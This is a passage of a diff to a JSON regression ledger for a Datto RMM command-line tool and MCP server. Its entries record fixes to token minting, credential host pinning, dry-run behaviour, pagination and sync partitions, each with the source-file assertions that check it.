-     "min_count": 1,
+     "file": "cli/internal/credwire/mcp_confirm_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file (through the credential kit) on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
      "code_only": true
     },
     {
-     "file": "cli/cmd/datto-rmm-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/credwire/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-changes-nothing",
+   "status": "active",
+   "summary": "--dry-run changes no local file: auth set-token saves nothing, auth logout clears nothing, export --output leaves the file alone (the preview goes to stdout)",
+   "why": "Press-traps s6, measured on this tree: `auth set-token --dry-run` saved the token to credentials.toml, `auth logout --dry-run` cleared the stored credentials, and `export organizations --output f --dry-run` replaced f with the preview. The auth blocks are the fleet replay's auth-dry-run recipe text (this connector's ledger never carried that entry). TestDryRunChangesNoLocalFile seen failing (seen/dry-run-changes-nothing-seen-failing.log). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_dryrun.go",
+     "contains": "would read a token from stdin and save it to the credential store",
      "code_only": true
     },
     {
-     "file": "cli/cmd/datto-rmm-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/datto_dryrun.go",
+     "contains": "(dry run - nothing changed)",
      "code_only": true
     },
     {
-     "file": "cli/cmd/datto-rmm-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/datto_export.go",
+     "contains": "if flags.dryRun {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/datto_dryrun_writes_test.go",
+     "contains": "func TestDryRunChangesNoLocalFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-minted-per-client",
+   "status": "active",
+   "summary": "Every API client the CLI, the novel commands and the MCP server build mints the Datto RMM bearer from DATTO_RMM_API_KEY + DATTO_RMM_API_SECRET_KEY on first use (password grant, Basic public-client:public) through its own pinned transport; never under --dry-run or the verifier; DATTO_RMM_TOKEN wins over minting",
+   "why": "PUBLISHED REGRESSION: the 4.22 library minted in root.go newClient; the 4.24 reprint (published 0.1.8 / 0.1.10) lost that edit, so a key and secret alone answered 401 on every API command and every MCP tool until the operator ran `auth login` by hand, and the README's 'mints for you' was false. Restored as a registerClientHook (internal/cli/datto_guard.go mintForClient), which reaches every client the generated CLI and MCP constructors build, so a regeneration cannot drop it again.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestKeyAndSecretMintOnTheFirstAPICall(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestDryRunNeverMints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "return mintForClient(c, base)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "if c == nil || c.Config == nil || c.DryRun || cliutil.IsVerifyEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "config.EnsureDattoTokenWith(context.Background(), tokenClient, c.Config)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "platform-routes-every-request",
+   "status": "active",
+   "summary": "DATTO_RMM_PLATFORM (or DATTO_RMM_API_URL) chooses the base URL inside config.Load and counts as an explicit base URL wherever config.go read DATTO_RMM_BASE_URL (the final override, the untrusted-route unblock, the credential target); an unknown platform refuses to load; DATTO_RMM_BASE_URL wins, then DATTO_RMM_API_URL",
+   "why": "PUBLISHED REGRESSION: the 4.24 print applied DATTO_RMM_PLATFORM only in `auth login`, so an account on pinotage minted its token on pinotage and then sent it to the merlot default on every API call (401, and a credential sent to another Datto platform). Two anchored edits in the generated config.go (tools/apply_edits.py) over hand functions in internal/config/datto_oauth.go.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := checkDattoPlatform(); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "dattoBaseURLEnv()",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "cliutil.EnvOverride(\"DATTO_RMM_BASE_URL\")"
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func DattoPlatformBaseURL() (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func dattoBaseURLEnv() string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestPlatformRoutesTheBaseURL(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestPlatformIsTheCredentialTarget(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "minted-token-bound-to-key-and-host",
+   "status": "active",
+   "summary": "A minted token is recorded with a binding (32 hex digits: a fingerprint of the API host and one of the API key, saved as the credential store's client_id) and sent only for that binding: one mint per binding per process, a stored token reused only for the same key and host, another key mints its own; with no key configured, a stored minted token is dropped when its binding names another host (a token `auth set-token` saved has no binding and stays the operator's choice)",
+   "why": "Work-order host pinning and the action1/appdirect class 'cached authentication ignores credential override': 0.1.10's `auth login` saved one token to config.toml with no record of the key or platform it came from, so switching DATTO_RMM_API_KEY or DATTO_RMM_PLATFORM sent the old token with the new key or to the new host. The binding holds no part of the key and no separator (it is held as a credential-named value and must not read as a word or a host).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func DattoTokenBinding(baseURL, apiKey string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "if cfg.AccessToken != \"\" && cfg.ClientID == binding && dattoTokenLive(cfg.TokenExpiry) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "o != dattoOriginFingerprint(c.BaseURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func dropDattoTokenOutsideItsBinding(c *Config) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "_ = cfg.SaveTokens(binding, \"\", token, \"\", expiry)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "if err := cfg.SaveTokens(binding, \"\", token, \"\", expiry); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestStoredTokenIsBoundToItsKeyAndHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestMintPostsThePasswordGrantToTheAPIHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "dropDattoTokenOutsideItsBinding(cfg)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mint-pinned-to-api-host",
+   "status": "active",
+   "summary": "The token request goes only to <API host>/auth/oauth/token over a client that follows no redirect and refuses any other host (NewDattoTokenClient, used by the mint hook and `auth login`); the fixed public client is added beneath the credential kit, so the word public is never a held value; a base URL with userinfo, a non-http scheme or a non-ASCII host mints nothing; the error text never repeats the server's answer",
+   "why": "Work-order credential rule (host pinning). 0.1.10's MintDattoToken used a default http.Client, which re-sends a 307/308 POST body (the API key and secret) to whatever host the Location names.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "return errors.New(\"refused: the Datto RMM token endpoint answered with a redirect\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "hc, err := client.NewPlainHTTPClient(30*time.Second, cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func dattoPlaintextRefused(endpoint string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_mint_test.go",
+     "contains": "func TestMintRefusesPlaintextOffLoopback(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestTokenRequestNeverFollowsARedirect(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func NewDattoTokenClient(baseURL string, base http.RoundTripper) *http.Client {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "Transport: OutboundGuard(dattoTokenTripper{origin: DattoOrigin(baseURL), next: base})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func (t dattoTokenTripper) RoundTrip(req *http.Request) (*http.Response, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "config.NewDattoTokenClient(cfg.BaseURL, hc.Transport)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestPublicClientWordsStillPrint(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestRedirectNeverReachesAnotherHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestAuthLoginMintsOnlyAtItsHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-scope-stable-across-mints",
+   "status": "active",
+   "summary": "The local SQLite store is named by the API host and key binding (config.StoreScopeIdentity), not by the bearer token, so a re-minted token (about every 100 hours, or every run under DATTO_RMM_NO_CONFIG_WRITE) keeps the same store and the fleet analytics keep their synced data",
+   "why": "Press 4.34.2 scopes the default store file by a hash of the credential in effect (AuthHeader first), so every new token opened a new, empty data-<hash>.db: after a re-mint every fleet analytic read nothing, silently. StoreScopeIdentity is the press's own lever for 'a print whose session token rotates'.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "StoreScopeIdentity = dattoStoreScope",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func dattoStoreScope(c *Config) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth_test.go",
+     "contains": "func TestStoreScopeSurvivesARemint(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-dry-run-sends-nothing",
+   "status": "active",
+   "summary": "`auth login --dry-run` names the token request and sends nothing (no mint, no save); `auth login` is registered under `auth` and refuses under DATTO_RMM_NO_CONFIG_WRITE or a credential route Load refused",
+   "why": "0.1.10's hand `auth login` minted and saved under --dry-run. The generated auth.go does not register a hand login command; tools/apply_edits.py adds the one AddCommand line.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "if flags.dryRun {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "if cfg.CredentialRouteBlocked() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cmd.AddCommand(newAuthLoginCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestDryRunNeverMints(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-setup-names-the-key-pair",
+   "status": "active",
+   "summary": "`auth setup` prints the Datto path (DATTO_RMM_API_KEY, DATTO_RMM_API_SECRET_KEY and DATTO_RMM_PLATFORM, then `auth login`) before the generated set-token step; README and SKILL Auth Setup say the same and list DATTO_RMM_PLATFORM, DATTO_RMM_API_URL, DATTO_RMM_BASE_URL and DATTO_RMM_NO_CONFIG_WRITE",
+   "why": "The generated setup steps offer only `auth set-token` and DATTO_RMM_TOKEN, which a Datto operator never has; they generate an API key pair. tools/apply_edits.py (auth.go) and tools/apply_docfixes.py (README, SKILL).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "Set the API key pair and your region, then mint and save a token (any API command also mints one on first use):",
+     "code_only": true
+    },
+    {
+     "file": "guide.md",
+     "contains": "| `DATTO_RMM_PLATFORM` | config | No |"
+    }
+   ]
+  },
+  {
+   "id": "sync-follows-next-page-url",
+   "status": "active",
+   "summary": "Every sync partition walks Datto's pageDetails.nextPageUrl as a cursor (only its page value is kept; the request goes to the configured host) and asks max=250 (activity-logs: size=250); only a null next link ends a walk, so a server page cap below the requested size never truncates the copy or marks it complete for pruning",
+   "why": "Vendor-documented shape (spec PaginationData {count,totalCount,prevPageUrl,nextPageUrl}). The springdoc spec puts the page schemas under 401/403 only, so neither 4.24 nor 4.34.2 detects the next link or the max param: 0.1.10 sent limit=100 (ignored) and stored only the first page of every list (an MSP with more devices than one page saw a partial fleet in every analytic); the raw 4.34.2 render would also skip page 1 (its page-int fallback asks page=2 after an implicit page 0). tools/apply_edits.py rewrites the 17 page cases of determinePaginationDefaults.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "nextCursorPath: \"pageDetails.nextPageUrl\",",
+     "code_only": true,
+     "min_count": 17
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "cursorType:     \"cursor\",",
+     "code_only": true,
+     "min_count": 17
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "limitParam:     \"max\",",
+     "code_only": true,
+     "min_count": 16
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\t\t\tnextCursorPath: \"\","
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestSyncWalksEveryLinkedPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-partition-names-pinned",
+   "status": "active",
+   "summary": "sync keeps the 0.1.10 partition names: account = /v2/account/sites (the name every fleet analytic reads as sites), account-components = /v2/account/components; activity-logs stays in the default sync (fleet device-timeline reads it)",
+   "why": "Press 4.34.2 ranks a group's sync candidates by endpoint name and re-pointed `account` from sites to components (sites became `account-sites`), and dropped /v2/activity-logs from the default sync. An upgraded store would then hold components under the name the novels read as sites. tools/resource_names.py renames partition identifiers inside the name-keyed sync maps only (press-traps s6, the acronis class).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"account\":                    \"/v2/account/sites\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"account-components\":         \"/v2/account/components\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"activity-logs\", // datto-rmm handfix: activity-logs-default-sync",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/fleet_shared.go",
+     "contains": "fleetSitesResource          = \"account\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_sync_keys_test.go",
+     "contains": "func TestShippedPartitionNamesHold(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "users-keyed-on-username",
+   "status": "active",
+   "spec_encoded": true,
+   "summary": "Synced account users key on username (x-resource-id on /v2/account/users), so sync stores every user instead of 0 of N",
+   "why": "A Datto user record (vendor schema in UsersPage.users) has lastName, firstName, username, email and no id/uid/name, so every generic ID fallback missed and 0.1.10 stored no users (all_items_failed_id_extraction), the same class as #258 for alerts. Spec-encoded (tools/spec_fix.py), so it survives every reprint.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"account-users\":           \"username\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"account-users\":           \"username\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_sync_keys_test.go",
+     "contains": "func TestUsersKeyOnUsername(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-datto-root-not-placeholder",
+   "status": "active",
+   "summary": "doctorShippedBaseURL is empty: https://merlot-api.centrastage.net/api is Datto's merlot platform (a real host), so doctor dials it and probes the credential instead of reporting 'base_url is still the shipped placeholder' on every healthy default install",
+   "why": "Press-traps s5: the fleet doctor-verdict template set doctorShippedBaseURL to the connector's default base URL, a real platform MSPs on merlot use. tools/apply_post_replay.py re-applies it after a fresh replay.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestDoctorProbesTheMerlotDefault(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "key-pair-reads-as-configured",
+   "status": "active",
+   "summary": "An API key and secret count as configured credentials (config.CredentialConfigured): `auth status` reports authenticated, and doctor's credential probe mints from the pair and verifies it instead of reporting 'no credential is configured'",
+   "why": "The pair mints on first use, but the generated status and doctor read only the Authorization header of a freshly loaded config, so every key-pair install (the normal one) read as unconfigured and doctor never probed it. The appdirect pair-counts-as-configured shape; tools/apply_edits.py (config.go, auth.go, doctor.go).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "|| (c.DattoRmmApiKey != \"\" && c.DattoRmmApiSecretKey != \"\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "authed := header != \"\" || cfg.CredentialConfigured()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if authHeader == \"\" && !cfg.CredentialConfigured() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestKeyPairReadsAsConfigured(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestDoctorVerifiesTheKeyPair(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "list-all-follows-next-page-url",
+   "status": "active",
+   "summary": "Every generated list command's --all walks pageDetails.nextPageUrl as a cursor with max=250 (activity logs: size=250), like sync",
+   "why": "The generated list commands paged --all as an integer page walk with no size and no next link: page 0 implicit, then page=2, so page 1 of every list was lost (vendor-documented PaginationData). tools/apply_edits.py rewrites the paginatedGet arguments of the 21 list commands.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/account_get-user-devices.go",
+     "contains": "flagAll, \"page\", \"cursor\", \"max\", 250, \"pageDetails.nextPageUrl\", \"\", \"\", cmd.ErrOrStderr())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/promoted_activity-logs.go",
+     "contains": "flagAll, \"page\", \"cursor\", \"size\", 250, \"pageDetails.nextPageUrl\", \"\", \"\", cmd.ErrOrStderr())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/account_get-sites.go",
+     "not_contains": "flagAll, \"page\", \"page\", \"\", 0, \"\", \"\", \"\""
+    },
+    {
+     "file": "cli/internal/cli/datto_flow_test.go",
+     "contains": "func TestListAllWalksEveryLinkedPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-preview-never-mints",
+   "status": "active",
+   "summary": "A datto-rmm_execute call that only previews (a write method without boolean confirm: true) builds a client that does not mint, so the preview sends nothing at all, the token request included",
+   "why": "The generated execute handler builds its client before the confirm check, and the client hook mints on construction, so a preview of a write still posted the API key and secret to the token endpoint. One anchored line in code_orch.go (tools/apply_edits.py) over hand files internal/mcp/datto_preview_client.go and the WithoutMintFor marker in datto_guard.go.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "newMCPClientForCall(ctx, method == \"GET\" || codeOrchConfirmAccepted(args[\"confirm\"]))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/datto_preview_client.go",
+     "contains": "func newMCPClientForCall(ctx context.Context, sends bool) (*client.Client, *platform.Session, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "if _, skip := dattoNoMint.Load(c.Config); skip {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/mcp_confirm_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-follows-next-page-url",
+   "status": "active",
+   "summary": "`export <list>` reads every Datto page from page 0 by following pageDetails.nextPageUrl, writes one line per record, opens --output only after every page is read, and under --dry-run shows the first request and writes nothing",
+   "why": "Tests-helper finding: the generated export asked page 1 first (page 0 lost), wrote whole page objects as records and never stopped (6,792 requests in 60 s against the double; up to 100,000 live). Hand file internal/cli/datto_export.go (registerNovelCommand wrap).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_export.go",
+     "contains": "func runDattoExportList(cmd *cobra.Command, flags *rootFlags, resource string) (err error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_export.go",
+     "contains": "\"page\", \"cursor\", sizeParam, size, \"pageDetails.nextPageUrl\", \"\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_review_r1_test.go",
+     "contains": "func TestExportWalksEveryDattoPageAndStops(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-udf-novel",
+   "status": "active",
+   "summary": "New novel `fleet udf <slot>`: one device user-defined field (udf1 .. udf300) rolled up across the synced fleet: distinct values with device and site counts, empty count, and the devices behind one value (--value) or the gaps (--empty); totals count every device before --limit",
+   "why": "Launch policy: keep every prior novel and add new ones. N6 of the 2026-06-05 brainstorm (rubric 8/10, cut only on weekly frequency). Read-only over the synced account-devices rows.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_udf.go",
+     "contains": "func newNovelFleetUdfCmd(flags *rootFlags) *cobra.Command {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_udf.go",
+     "contains": "func computeUdf(raws [][]byte, slot, match, value string, limit int) udfView {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_udf_test.go",
+     "contains": "func TestFleetUdfRollsUpOneSlot(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-identity-follows-the-configured-credential",
+   "status": "active",
+   "summary": "The most explicit credential names the identity and nothing stored stands in for it: an environment DATTO_RMM_TOKEN is the bearer (a stored access token and a stored auth_header are dropped from the loaded config); a configured API key, with or without its secret, allows only a token minted for that key on this host (a token bound to another key or to none, a stored auth_header and a stored rmm_token are dropped)",
+   "why": "Codex review r1 class credential identity mismatch (P1): the binding was checked only when the secret was also set, so DATTO_RMM_API_KEY=key-B alone sent key A's stored token; the generated AuthHeader preferred a stored access token (or a file auth_header) over DATTO_RMM_TOKEN, so account A's token went out while DATTO_RMM_TOKEN named account B.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "if c.DattoRmmToken != \"\" && c.envOverrides[\"DattoRmmToken\"] {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "if c.AccessToken != \"\" && c.ClientID != DattoTokenBinding(c.BaseURL, key) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_identity_test.go",
+     "contains": "func TestStoredCredentialNeverStandsInForTheConfiguredOne(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "local-partition-follows-the-path",
+   "status": "active",
+   "summary": "A sync partition serves and receives only the records of its own sync path: a generated read whose path is a sync path uses that partition, a read naming a sync partition of another path has no local read and no write-through cache, and a mutation response never enters a sync partition",
+   "why": "Codex review r1 class wrong local partition (P1): every generated account command named the one `account` partition (the synced /v2/account/sites every fleet analytic reads as sites), so `account get-user-devices --data-source local` returned sites and `account create-variable` wrote a variable into the sites partition. Hand file internal/cli/datto_partitions.go plus four anchored lines in data_source.go (tools/apply_edits.py EDITS3).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_partitions.go",
+     "contains": "func dattoLocalPartition(resourceType, path string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType = dattoLocalPartition(resourceType, path); resourceType == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "writeThroughCache(ctx, dattoLocalPartition(resourceType, path), data)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType == \"\" || syncOwnsPartition(resourceType) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_partition_test.go",
+     "contains": "func TestSyncPartitionHoldsOnlyItsOwnPath(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-reads-every-documented-shape",
+   "status": "active",
+   "summary": "Every struct a fleet analytic decodes a Datto record into decodes the record built from Datto's own schema (Device, Alert, Site, ActivityLog, Software, JobResults); ActivityLog.site and ActivityLog.user are read as the documented objects (SiteBasicDto, UserDto)",
+   "why": "Codex review r1 class documented field type misread (P1): fleet device-timeline read site and user as strings, so every real activity failed to decode and was skipped silently. The conformance test builds each record from spec.json, so a later struct edit that misreads a documented type fails.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_device_timeline.go",
+     "contains": "Site     fleetLogSite    `json:\"site\"`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_device_timeline.go",
+     "contains": "func fleetNameOrObject(b []byte, obj any, name func() string) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_job_results.go",
+     "contains": "type jobResultsRecord struct {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_schema_test.go",
+     "contains": "func TestFleetStructsDecodeEveryDocumentedShape(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "next-link-query-followed",
+   "status": "active",
+   "summary": "Every walk (sync, list --all, export, the fleet live reads) carries the whole query of Datto's pageDetails.nextPageUrl to the next request (activity logs: page=next with the searchAfter pointer), on the configured host and path",
+   "why": "Codex review r1 class next-link query dropped (P1): the pagers kept only the page value, so an activity-log walk asked page=next without the documented searchAfter pointer and repeated or lost activities. Hand file internal/client/datto_nextquery.go; anchored lines in helpers.go cursorFromNextURL and client.go doInternal (tools/apply_edits.py EDITS4).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/datto_nextquery.go",
+     "contains": "func DattoNextQueryToken(nextURL string) (string, bool) {",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "contains": "if tok, ok := client.DattoNextQueryToken(nextURL); ok {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/client/client.go",
+     "contains": "params = dattoExpandNextQuery(params)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_nextlink_test.go",
+     "contains": "func TestEveryWalkFollowsTheWholeNextLink(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-live-reads-walk-every-page",
+   "status": "active",
+   "summary": "`fleet sprawl --refresh` reads every SoftwarePage of each device along pageDetails.nextPageUrl; a device whose pages cannot all be read keeps its last synced software and is reported on stderr",
+   "why": "Codex review r1 class incomplete paging read as complete (P1): the refresh read one page per device and skipped a failed fetch silently, so software on later pages vanished from the report. Hand file internal/cli/datto_pages.go (dattoReadAllPages).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_pages.go",
+     "contains": "func dattoReadAllPages(ctx context.Context, c *client.Client, path, field, sizeParam string, size int) ([]json.RawMessage, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sprawl.go",
+     "contains": "dattoReadAllPages(ctx, c, \"/v2/audit/device/\"+url.PathEscape(dev.UID)+\"/software\", \"software\", \"max\", 250)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_livepages_test.go",
